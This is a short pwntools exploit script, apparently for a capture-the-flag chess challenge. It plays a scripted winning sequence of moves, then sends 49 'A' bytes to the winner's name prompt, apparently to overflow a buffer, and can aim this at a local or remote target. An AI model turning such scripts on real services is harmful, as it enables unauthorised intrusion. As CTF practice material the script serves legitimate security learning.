#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("main_IhXQ3Yg")
gs = """
ida_connect
brva 0x040A1
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()

moves = b'''e2 e4
e7 e5
d2 d3
f8 b4
c1 d2
b4 d2
e1 e2
d8 h4
e2 f3
h4 h3'''

moves = moves.split(b'\n')
for move in moves:
    p.sendlineafter(b"Input : ", move)

p.sendlineafter(b"Winner, What's your name? : ", b'A'*49)

p.interactive()
